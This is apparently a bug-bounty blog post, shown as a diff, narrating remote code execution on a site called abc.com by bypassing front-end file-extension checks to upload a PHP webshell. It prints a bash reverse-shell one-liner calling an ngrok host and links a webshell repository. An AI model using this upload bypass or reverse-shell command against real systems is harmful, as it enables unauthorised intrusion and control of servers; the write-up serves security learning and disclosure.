@@ -1,0 +1,63 @@
+<h1 id="remote-code-execution">Remote Code Execution</h1>
+<p>Remote code execution (RCE) refers to the ability of a cyber attacker to access and make changes to a computer owned by another, without authority and regardless of where the computer is geographically located. RCE allows an attacker to take over a computer or a server by running arbitrary malicious software (malware).</p>
+
+<p>Found a target using google dorks which having a responsible disclosure program. Let’s consider the target as abc.com the target website. During recon, I found that the target company owns 7 subdomains and each of them is integrated with the parent domain abc.com with some functionalities.</p>
+
+<p>So I quickly started doing directory brute-forcing to figure out the directories and guess what the website is fully made up of PHP, so if I found a way to upload a php file I can get a reverse shell. The website having a career page which we can upload pdf file as a resume.</p>
+
+<p>At the time of my recon, I found an uploads folder which contains all the uploaded documents of peoples who applied for jobs through this career page.</p>
+
+<p><strong>Directory brute-forcing using dirsearch</strong>
+<img src="/assets/images/blogs/RCE1/1.webp" alt="img" /></p>
+
+<p><strong>Index of uploaded files</strong>
+<img src="/assets/images/blogs/RCE1/2.webp" alt="img" /></p>
+
+<p>So I quickly directed to the https://www.abc.com/careers.php careers page and checked the CV upload functionality but the application is validating the file extensions at the front end only.</p>
+
+<p><strong>validating file extension at frontend</strong>
+<img src="/assets/images/blogs/RCE1/3.webp" alt="img" /></p>
+
+<p>So I quickly downloaded the PHP webshell and uploaded successfully</p>
+
+<p><img src="/assets/images/blogs/RCE1/4.webp" alt="img" /></p>
+
+<p>All required information are filled and click submit then intercepted the request and changed the file extension from pdf to PHP</p>
+
+<p><strong>uploaded webshell</strong>
+<img src="/assets/images/blogs/RCE1/5.webp" alt="img" /></p>
+
+<p>Then I quickly directed to the uploaded shell file location to trigger the PHP web shell.</p>
+
+<p><strong>webshell</strong>
+<img src="/assets/images/blogs/RCE1/6.webp" alt="img" /></p>
+
+<p>Finally, the webshell is working perfectly. To get a reverse shell we can upload the reverse shell instead of the webshell or we can simply use the below command on the web shell console to get access via port forwarding by using ngrok services.</p>
+
+<h3 id="php-webshell">PHP webshell</h3>
+<p><a href="https://github.com/thevillagehacker/Bug-Hunting/blob/main/Rev-shell/php_web_shell.php">GitHub Repo</a></p>
+
+<h2 id="getting-reverse-shell">Getting Reverse Shell</h2>
+<ul>
+  <li>Enable port forwarding</li>
+  <li>Listen to forwarded port using Netcat</li>
+</ul>
+
+<p><strong>port forwarding setup using ngrok</strong>
+<img src="/assets/images/blogs/RCE1/7.webp" alt="img" /></p>
+
+<p>Now the port forwarding is completed we can get the shell by executing the following command in the webshell input field</p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/1000 0&gt;&amp;1</code></p>
+
+<p><strong>execute reverse connection via bash</strong></p>
+
+<p><img src="/assets/images/blogs/RCE1/8.webp" alt="img" /></p>
+
+<p>Now we got the reverse shell successfully.</p>
+
+<p><img src="/assets/images/blogs/RCE1/9.webp" alt="img" /></p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>
